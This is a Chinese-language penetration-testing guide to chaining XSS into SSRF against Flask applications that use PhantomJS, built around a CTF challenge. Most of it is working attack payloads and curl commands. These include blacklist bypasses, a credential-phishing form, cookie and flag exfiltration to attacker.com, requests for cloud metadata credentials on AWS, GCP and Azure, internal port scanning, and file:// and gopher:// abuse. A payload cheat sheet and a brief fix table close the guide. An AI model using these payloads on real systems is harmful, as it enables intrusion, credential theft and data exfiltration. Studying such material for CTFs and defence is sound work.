# Flask+PhantomJS XSS 与 SSRF 组合攻击

## 1. 文档概述

### 1.1 编写目的

本文档为渗透测试人员提供一套系统化的 Flask+PhantomJS 架构 XSS 与 SSRF 组合攻击方法论。重点针对使用 PhantomJS 进行 XSS 验证的 CTF 挑战应用，通过 XSS 漏洞实现服务器端请求伪造（SSRF）。

### 1.2 适用范围

- 适用于使用 Flask 框架结合 PhantomJS 进行 XSS 验证的应用
- 适用于 CTF XSS 挑战类应用
- 适用于头less 浏览器加载用户可控 HTML 的场景
- 适用于存在弱黑名单过滤的 XSS 场景
- 适用于 HTML 属性上下文未编码的注入场景

### 1.3 读者对象

- 执行渗透测试任务的安全工程师
- CTF 竞赛参赛选手
- 进行 XSS 和 SSRF 漏洞研究的安全分析师

---

## 2. 核心渗透技术专题

### 2.1 技术介绍

#### 漏洞原理

**架构特征：**
```
用户请求 → Flask 应用 → 弱黑名单过滤 → HTML 模板生成 → 
临时文件创建 → PhantomJS 加载 → JavaScript 执行 → 
网络请求发起（SSRF） → 结果返回
```

**典型代码模式：**

```python
# Flask 应用代码（app.py）
@app.route('/page')
def challenge_page():
    msg = request.args.get('name', '')
    
    # 弱黑名单过滤（仅过滤 a-y 字母开头的标签）
    blacklist = r'<[a-yA-Y/]+'
    blacklisted_words = re.findall(blacklist, msg, re.IGNORECASE)
    
    if blacklisted_words:
        return "Sorry, you can't use that tag"
    
    # 无编码直接插入 HTML 属性上下文
    value = '> {0}'.format(msg)
    data = PAGE_CONTENT.format("31", "Umbrella", value, "", "")
    
    # 创建临时 HTML 文件
    fn = "static/" + os.urandom(16).encode('hex') + '.html'
    open(fn, 'w').write(page)
    
    # PhantomJS 加载 HTML（SSRF 入口）
    proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"],
                           stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    proc.stdin.write('http://localhost:5000/' + fn)
    
    # 获取执行结果
    result = proc.communicate()[0]
    os.unlink(fn)
    
    # 如果检测到 XSS，返回 Flag
    if 'XSS' in result:
        return Response(flag_content)
```

**PhantomJS 脚本（check.js）：**
```javascript
var page = require('webpage').create();
var system = require('system');

// 从 stdin 读取 URL
var input = system.stdin.readLine();

// 加载页面（用户控制的 HTML）
page.open(input, function(status) {
    // 捕获 alert/confirm/prompt
    page.onAlert = function(msg) { console.log('ALERT:' + msg); };
    page.onConfirm = function(msg) { console.log('CONFIRM:' + msg); };
    page.onPrompt = function(msg) { console.log('PROMPT:' + msg); };
    
    // 自动触发 focus 事件
    page.evaluate(function() {
        var focused = document.querySelector(':focus');
        if (focused) {
            var event = document.createEvent('HTMLEvents');
            event.initEvent('focus', true, false);
            focused.dispatchEvent(event);
        }
    });
    
    setTimeout(function() { phantom.exit(); }, 5000);
});
```

**本质问题：**
1. **弱黑名单过滤**：仅过滤 `<[a-yA-Y/]+`，允许 `<z>` 标签和事件处理器
2. **无输出编码**：用户输入直接插入 HTML 属性上下文
3. **PhantomJS 网络访问**：头less 浏览器可访问任意 URL
4. **自动事件触发**：check.js 主动触发 focus 事件

#### 攻击场景

| 业务场景 | 功能示例 | 风险点描述 |
| :--- | :--- | :--- |
| **CTF XSS 挑战** | Dalgona Challenges | 使用 PhantomJS 验证 XSS 是否成功 |
| **网页截图服务** | 用户提交 URL 生成截图 | PhantomJS 访问任意 URL |
| **页面预览功能** | 预览用户提交的链接 | 头less 浏览器加载外部内容 |
| **PDF 生成服务** | HTML 转 PDF | 用户 HTML 中的 JS 被执行 |
| **自动化测试** | 头less 浏览器测试 | 测试脚本加载用户内容 |

### 2.2 漏洞探测方法

#### 2.2.1 黑盒测试

**步骤 1：应用结构识别**

```bash
# 检测 Flask 应用
curl -I http://target/
# Server: Werkzeug/1.0.1 Python/2.7.18

# 检测 PhantomJS 使用特征
# 响应时间较长（5 秒左右）
# 返回内容包含 JavaScript 执行结果
```

**步骤 2：输入点探测**

```bash
# 测试参数反射
curl "http://target/page?name=test"
# 查看响应中是否包含 test

# 确定 HTML 上下文
curl "http://target/page?name=test" | grep -i "test"
# 可能的位置：
# - value="test"  （双引号属性内）
# - value=test>   （无引号属性）
# - >test<        （标签体）
```

**步骤 3：黑名单规则探测**

```bash
# 测试 script 标签
curl "http://target/page?name=<script>alert(1)</script>"
# 响应：Sorry, you can't use that tag

# 测试 img 标签
curl "http://target/page?name=<img src=x onerror=alert(1)>"
# 响应：Sorry, you can't use that tag

# 测试 z 标签（绕过）
curl "http://target/page?name=<zzz onclick=alert(1)>click"
# 响应：成功执行（未被拦截）

# 测试事件处理器
curl "http://target/page?name=onfocus=alert(1)autofocus"
# 响应：成功执行（未被拦截）
```

**步骤 4：PhantomJS 执行确认**

```bash
# 使用 alert 触发
curl "http://target/page?name=%3Czzz%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E"
# 如果返回 Flag，说明 PhantomJS 执行成功

# 使用 prompt 触发（如果 alert 被过滤）
curl "http://target/page?name=%3Czzz%20onfocus%3Dprompt%28%27XSS%27%29%20autofocus%3E"
```

#### 2.2.2 白盒测试

**代码审计关键词：**

```python
# 搜索 PhantomJS 调用
grep -r "phantomjs" src/
grep -r "subprocess.Popen" src/
grep -r "check.js" src/

# 搜索黑名单过滤
grep -r "blacklist" src/
grep -r "re.findall" src/
grep -r "re.sub" src/

# 搜索 HTML 生成
grep -r "\.format(" src/
grep -r "f'" src/
grep -r "f\"" src/
```

**数据流追踪：**

```
用户输入 (request.args.get)
    ↓
黑名单验证 (re.findall)
    ↓
HTML 插入 (.format())
    ↓
临时文件创建 (open().write())
    ↓
PhantomJS 加载 (subprocess.Popen)
    ↓
JavaScript 执行 (page.evaluate)
    ↓
网络请求 (fetch/XMLHttpRequest)
```

### 2.3 漏洞利用方法

#### 2.3.1 XSS 基础利用

**场景 1：获取 CTF Flag**

```bash
# Payload: 使用<z>标签绕过黑名单
curl "http://localhost:38291/page?name=%3Czzz%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E"

# 响应：
# Congratulations! Here is the flag: FLAG{d133f80d05cf6218c6d0bb7fdbb8d21ed3340bb34ff1492a7e96b71ba9b1a482}
```

**场景 2：DOM 篡改**

```bash
# Payload: 修改页面样式
curl "http://target/page?name=%3Czzz%20onclick%3Ddocument.body.style.backgroundColor%3D%27red%27%3Eclick%20me"

# Payload: 修改图片源
curl "http://target/page?name=%3Czzz%20onclick%3Ddocument.querySelector%28%27img%27%29.src%3D%27https%3A//evil.com/steal.png%27%3Emodify%20page"
```

**场景 3：凭证钓鱼**

```bash
# Payload: 创建钓鱼表单
PAYLOAD='<zzz onclick="document.body.innerHTML=\x27<form action=http://attacker.com/steal><input name=user><input name=pass type=password><button>Login</button></form>\x27">click</zzz>'

curl "http://target/page?name=$PAYLOAD"
```

#### 2.3.2 SSRF 高级利用

**场景 1：访问内部服务**

```bash
# Payload: 访问 localhost:5000
PAYLOAD='<zzz onfocus="var x=new XMLHttpRequest();x.open(\"GET\",\"http://localhost:5000/\",false);x.send();alert(\"STATUS:\"+x.status+\" LEN:\"+x.responseText.length)" autofocus>'

curl "http://target/page?name=$(echo $PAYLOAD | urlencode)"

# 响应：
# Oops! You triggered an alert with STATUS:200 LEN:1097 instead of the expected value
```

**场景 2：内网端口扫描**

```bash
# Payload: 扫描常见端口
PAYLOAD='<zzz onfocus="var ports=[22,80,443,3306,5432,6379,8080];ports.forEach(function(p){new Image().src=\"http://host.docker.internal:9999/port-\"+p});alert(\"scan\")" autofocus>'

# 设置监听器
python3 -m http.server 9999 --bind 127.0.0.1

# 发送 Payload
curl "http://target/page?name=$(echo $PAYLOAD | urlencode)"

# 监听器收到请求：
# 127.0.0.1 - - [28/Oct/2025 16:44:02] "GET /port-80 HTTP/1.1" 404 -
# 127.0.0.1 - - [28/Oct/2025 16:44:02] "GET /port-3306 HTTP/1.1" 404 -
# 127.0.0.1 - - [28/Oct/2025 16:44:02] "GET /port-6379 HTTP/1.1" 404 -
```

**场景 3：云元数据服务访问**

```bash
# AWS EC2 元数据
PAYLOAD='<zzz onfocus="fetch(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\").then(r=>r.text()).then(alert)" autofocus>'

curl "http://target/page?name=$(echo $PAYLOAD | urlencode)"

# GCP 元数据
PAYLOAD='<zzz onfocus="var x=new XMLHttpRequest();x.open(\"GET\",\"http://metadata.google.internal/computeMetadata/v1/\",false);x.setRequestHeader(\"Metadata-Flavor\",\"Google\");x.send();alert(x.responseText)" autofocus>'

# Azure 元数据
PAYLOAD='<zzz onfocus="var x=new XMLHttpRequest();x.open(\"GET\",\"http://169.254.169.254/metadata/instance?api-version=2021-02-01\",false);x.setRequestHeader(\"Metadata\",\"true\");x.send();alert(x.responseText)" autofocus>'
```

**场景 4：数据外带**

```bash
# Payload: 通过 DNSLog 外带
PAYLOAD='<zzz onfocus="fetch(\"http://attacker.com/log?data=\"+btoa(document.body.innerHTML.substring(0,500)))" autofocus>'

# Payload: 通过 Image Beacon 外带
PAYLOAD='<zzz onfocus="new Image().src=\"http://attacker.com/steal.jpg?cookie=\"+document.cookie" autofocus>'

# Payload: 提取 Flag 并外带
PAYLOAD='<zzz onfocus="fetch(window.location).then(r=>r.text()).then(t=>{var m=t.match(/flag\{.*?\}/);if(m)fetch(\"http://attacker.com/?flag=\"+m[0])})" autofocus>'
```

#### 2.3.3 完整攻击链

**实战攻击链：**

```bash
# 步骤 1：确认应用特征
curl -I http://localhost:38291/
# Server: Werkzeug/1.0.1 Python/2.7.18

# 步骤 2：探测黑名单规则
curl "http://localhost:38291/page?name=<script>alert(1)</script>"
# 响应：Sorry, you can't use that tag

curl "http://localhost:38291/page?name=<zzz onclick=alert(1)>click"
# 响应：成功执行

# 步骤 3：获取 Flag（XSS 验证）
curl "http://localhost:38291/page?name=%3Czzz%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E"
# 响应：FLAG{d133f80d05cf6218c6d0bb7fdbb8d21ed3340bb34ff1492a7e96b71ba9b1a482}

# 步骤 4：SSRF 内网探测
curl "http://localhost:38291/page?name=%3Czzz%20onfocus%3Dvar%20x%3Dnew%20XMLHttpRequest%28%29%3Bx.open%28%22GET%22%2C%22http%3A//localhost%3A5000/%22%2Cfalse%29%3Bx.send%28%29%3Balert%28%22STATUS%3A%22%2Bx.status%2B%22%20LEN%3A%22%2Bx.responseText.length%29%20autofocus%3E"
# 响应：STATUS:200 LEN:1097

# 步骤 5：数据外带
curl "http://localhost:38291/page?name=%3Czzz%20onfocus%3Dfetch%28%22/secret.txt%22%29.then%28r%3D%3Er.text%28%29%29.then%28t%3D%3Efetch%28%22http%3A//attacker.com/%3F%22%2Bt%29%29%20autofocus%3E"
```

### 2.4 漏洞利用绕过方法

#### 2.4.1 黑名单绕过

**绕过方法 1：使用<z>标签**

```bash
# 黑名单：r'<[a-yA-Y/]+'
# 绕过：<zzz>, <Z>, <zebra> 等

<zzz onclick=alert(1)>click</zzz>
<Z onfocus=alert(1) autofocus>
<zebra onload=alert(1)>
```

**绕过方法 2：事件处理器注入**

```bash
# 不依赖标签，直接注入事件处理器
onfocus=alert(1)autofocus
onmousemove=alert(document.domain)
onanimationstart=alert(1)style=animation-name:x
```

**绕过方法 3：空格绕过**

```bash
# 如果空格被过滤
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<input/onfocus=alert(1)autofocus>
```

#### 2.4.2 CSP 绕过

```bash
# 如果应用设置 CSP
# Content-Security-Policy: default-src 'self'

# 绕过方法 1：利用内联事件（如果 CSP 未设置 script-src 'none'）
<zzz onfocus=alert(1) autofocus>

# 绕过方法 2：利用 data: URI
<zzz onfocus="location='data:text/html,<script>alert(1)</script>'" autofocus>

# 绕过方法 3：利用 unsafe-inline
# 如果 CSP 包含 unsafe-inline，直接执行
```

#### 2.4.3 PhantomJS 限制绕过

```bash
# 如果 PhantomJS 限制网络访问

# 方法 1：使用 file://协议读取本地文件
PAYLOAD='<zzz onfocus="var x=new XMLHttpRequest();x.open(\"GET\",\"file:///etc/passwd\",false);x.send();alert(x.responseText)" autofocus>'

# 方法 2：使用 gopher://协议（如果支持）
PAYLOAD='<zzz onfocus="fetch(\"gopher://localhost:6379/_GET%20info%20HTTP/1.1%0D%0A%0D%0A\").then(r=>r.text()).then(alert)" autofocus>'
```

---

## 3. 附录

### 3.1 检测清单

```
□ 确认 Flask/Werkzeug 应用
□ 检测 PhantomJS 使用特征（响应时间、执行结果）
□ 探测黑名单规则（测试常见标签和事件）
□ 确认 HTML 输出上下文
□ 测试<z>标签绕过
□ 测试 autofocus 自动触发
□ 验证 PhantomJS 执行成功（返回 Flag）
□ 测试 SSRF 能力（访问 localhost）
□ 测试内网端口扫描
□ 测试云元数据访问
□ 测试数据外带
```

### 3.2 Payload 速查表

| 目的 | Payload | 说明 |
| :--- | :--- | :--- |
| 基础 XSS | `<zzz onfocus=alert(1) autofocus>` | 绕过黑名单 |
| 获取 Flag | `<zzz onfocus=alert('XSS') autofocus>` | 触发 PhantomJS 检测 |
| 访问内部服务 | `<zzz onfocus="var x=new XMLHttpRequest();x.open('GET','http://localhost:5000/',false);x.send();alert(x.status)" autofocus>` | SSRF 探测 |
| 端口扫描 | `<zzz onfocus="[22,80,443].forEach(p=>new Image().src='http://host:9999/port-'+p)" autofocus>` | 多端口探测 |
| AWS 元数据 | `<zzz onfocus="fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(alert)" autofocus>` | 云凭证窃取 |
| 数据外带 | `<zzz onfocus="fetch('/flag').then(r=>r.text()).then(t=>fetch('http://attacker.com/?'+t))" autofocus>` | 外带敏感数据 |
| DOM 篡改 | `<zzz onclick="document.body.innerHTML='<h1>XSS</h1>'">click</zzz>` | 页面 defacement |

### 3.3 修复建议

| 问题 | 修复方案 |
| :--- | :--- |
| 弱黑名单过滤 | 使用白名单验证，仅允许字母数字 |
| 无输出编码 | 使用 `html.escape(input, quote=True)` |
| PhantomJS 网络访问 | 配置网络隔离，阻止访问内网 |
| 自动事件触发 | 移除 check.js 中的事件触发逻辑 |
| 临时文件 Web 可访问 | 将临时文件存储在 Web 根目录外 |
| 无 CSP 保护 | 添加 `Content-Security-Policy: default-src 'self'; script-src 'none'` |
